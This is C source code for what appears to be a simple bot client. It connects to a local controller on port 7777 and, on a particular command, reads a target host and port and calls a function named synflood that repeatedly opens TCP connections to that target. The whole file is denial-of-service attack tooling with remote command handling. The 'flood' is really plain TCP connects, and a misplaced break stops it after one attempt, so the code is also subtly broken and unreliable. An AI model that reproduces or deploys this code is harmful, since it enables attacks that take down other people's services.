#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h> 

void error(const char *msg)
{
    perror(msg);
    //exit(0);
}

void printtesttext(){
	printf("Test message");
}

void synflood(char* host, int port){
	while(1){
		int sockfd, n;
		static int portno2;
		struct sockaddr_in serv_addr;
		struct hostent *server;

		portno2 = port;
		sockfd = socket(AF_INET, SOCK_STREAM, 0);
		if (sockfd < 0) 
			error("ERROR opening socket");
		server = gethostbyname(host);
		if (server == NULL) {
			fprintf(stderr,"ERROR, no such host\n");
			exit(0);
		}
		bzero((char *) &serv_addr, sizeof(serv_addr));
		serv_addr.sin_family = AF_INET;
		bcopy((char *)server->h_addr, 
			(char *)&serv_addr.sin_addr.s_addr,
			server->h_length);
		serv_addr.sin_port = htons(portno2);
		if (connect(sockfd,(struct sockaddr *) &serv_addr,sizeof(serv_addr)) < 0)
			error("ERROR connecting");
			break;
		close(sockfd);
	}
}

int main(int argc, char *argv[])
{
    int sockfd, n;
    static int portno;
    struct sockaddr_in serv_addr;
    struct hostent *server;

    char buffer[256];
    portno = 7777;
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd < 0) 
		error("ERROR opening socket");
	server = gethostbyname("127.0.0.1");
	if (server == NULL) {
		fprintf(stderr,"ERROR, no such host\n");
		exit(0);
	}
	bzero((char *) &serv_addr, sizeof(serv_addr));
	serv_addr.sin_family = AF_INET;
	bcopy((char *)server->h_addr, 
		(char *)&serv_addr.sin_addr.s_addr,
		server->h_length);
	serv_addr.sin_port = htons(portno);
	if (connect(sockfd,(struct sockaddr *) &serv_addr,sizeof(serv_addr)) < 0) 
		error("ERROR connecting");
	n = write(sockfd, "Client connected", 17);
	if (n < 0) 
		error("ERROR writing to socket");
	while(1){
		char h[256];
		int p;
		bzero(buffer,256);
		n = read(sockfd,buffer,255);
		if (n < 0) 
			error("ERROR reading from socket");
		int l = strlen(buffer);
		printf("%d\n",l);
		if (strlen(buffer) == 3) {	
			printtesttext();
		}
		if (strlen(buffer) == 6) {
			bzero(h,256);
			n = read(sockfd,h,255);
			if (n < 0) 
				error("ERROR reading from socket");
			bzero(buffer,256);
			n = read(sockfd,buffer,255);
			if (n < 0) 
				error("ERROR reading from socket");
			p = atoi(buffer);
			//close(sockfd);
			synflood(h, p);
			exit(0);
		}
		//printf("%s\n",buffer);
	}
	close(sockfd);
	
    return 0;
}
